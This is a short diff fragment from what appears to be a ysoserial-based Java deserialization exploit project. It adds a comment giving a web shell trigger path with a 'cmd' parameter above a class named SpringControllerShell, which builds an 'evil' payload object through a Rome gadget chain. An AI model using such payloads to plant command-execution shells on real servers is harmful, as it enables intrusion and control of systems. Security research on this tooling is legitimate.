@@ -8,6 +8,7 @@ import ysoserial.payloads.util.Encoder;
 import ysoserial.payloads.util.JavaCompiler;
 import ysoserial.payloads.util.ReadWrite;
 
+// /1nhann?cmd=id
 public class SpringControllerShell {
     public static void main(final String[] args) throws Exception {
         Object evil = new SpringControllerShell().getObject(RomeTools.class);
